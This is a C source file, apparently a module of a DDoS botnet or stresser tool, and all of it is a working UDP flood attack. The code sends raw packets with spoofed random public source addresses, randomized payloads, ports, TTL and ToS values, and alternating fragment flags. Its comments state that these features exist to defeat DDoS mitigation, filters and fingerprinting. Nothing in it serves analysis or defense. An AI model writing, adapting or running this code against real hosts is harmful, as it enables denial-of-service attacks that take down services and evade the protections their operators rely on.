#define _GNU_SOURCE
#include "headers/attack_params.h"

/* UDP Bypass flood — designed to evade layer4 DDoS mitigation:
   - Full payload randomization per packet (defeats signature/CRC filters)
   - Random spoofed source IP from non-bogon space (defeats source filters)
   - Random source port (defeats port-based rate limits)
   - Random TTL from realistic set {64,128,255} (defeats TTL fingerprinting)
   - Random ToS/DSCP (defeats QoS-based mitigation)
   - Alternating IP fragment flags (DF/MF) to confuse stateful inspection
   - Variable packet sizes (defeats fixed-size pattern filters)
   - IP ID randomized per packet                                           */

static uint32_t rand_public_ip(void) {
    uint32_t ip;
    do {
        ip = (uint32_t)rand();
        uint8_t a = (ip >> 24) & 0xFF;
        /* Skip bogon/private/reserved ranges */
        if (a == 0 || a == 10 || a == 127 || a >= 224) continue;
        uint8_t b = (ip >> 16) & 0xFF;
        if (a == 172 && b >= 16 && b <= 31) continue;
        if (a == 192 && b == 168) continue;
        if (a == 100 && b >= 64 && b <= 127) continue; /* RFC6598 */
        break;
    } while (1);
    return htonl(ip);
}

void* udpbypass_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (fd < 0) return NULL;

    int one = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        close(fd); return NULL;
    }

    int sndbuf = 16 * 1024 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    const int ip_size  = (int)sizeof(struct iphdr);
    const int udp_size = (int)sizeof(struct udphdr);
    const int min_pkt  = ip_size + udp_size + 1;

    int psize_min = params->len_min > 0 ? (int)params->len_min : 64;
    int psize_max = params->len_max > 0 ? (int)params->len_max : 1200;
    if (psize_min < min_pkt)   psize_min = min_pkt;
    if (psize_max < psize_min) psize_max = psize_min;
    if (psize_max > 1472)      psize_max = 1472;

    unsigned char packet[1500];
    memset(packet, 0, sizeof(packet));

    struct iphdr*  iph  = (struct iphdr*)packet;
    struct udphdr* udph = (struct udphdr*)(packet + ip_size);
    unsigned char* data = packet + ip_size + udp_size;
    int max_data = (int)(sizeof(packet) - ip_size - udp_size);

    /* Fixed IP header fields */
    iph->ihl      = 5;
    iph->version  = 4;
    iph->protocol = IPPROTO_UDP;
    iph->daddr    = params->target_addr.sin_addr.s_addr;
    udph->dest    = params->target_addr.sin_port;
    udph->check   = 0;

    /* Realistic TTL pool */
    const uint8_t ttl_pool[] = {64, 128, 255};

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr   = params->target_addr.sin_addr;
    dest.sin_port   = params->target_addr.sin_port;

    time_t end_time = time(NULL) + params->duration;
    uint64_t pkt = 0;

    while (params->active) {
        if ((pkt & 8191) == 0 && time(NULL) >= end_time) break;

        /* Randomize entire payload — defeat any content-based signatures */
        int psize = psize_min + (rand() % (psize_max - psize_min + 1));
        int dlen  = psize - ip_size - udp_size;
        if (dlen > max_data) dlen = max_data;
        for (int i = 0; i < dlen; i++)
            data[i] = (unsigned char)(rand() & 0xFF);

        /* Randomize all identifiable IP fields */
        iph->saddr   = rand_public_ip();
        iph->tot_len = htons((uint16_t)psize);
        iph->id      = htons((uint16_t)(rand() & 0xFFFF));
        iph->ttl     = ttl_pool[rand() % 3];
        iph->tos     = (unsigned char)((rand() & 0x1C) << 2); /* valid DSCP values */

        /* Alternate DF/no-DF to confuse stateful fragment tracking */
        iph->frag_off = (pkt & 1) ? htons(0x4000) : 0;

        iph->check = 0;
        iph->check = generic_checksum((unsigned short*)iph, ip_size);

        udph->source = htons((uint16_t)(1024 + rand() % 64511));
        udph->len    = htons((uint16_t)(psize - ip_size));

        sendto(fd, packet, psize, MSG_NOSIGNAL | MSG_DONTWAIT,
               (struct sockaddr*)&dest, sizeof(dest));
        pkt++;
    }

    close(fd);
    return NULL;
}
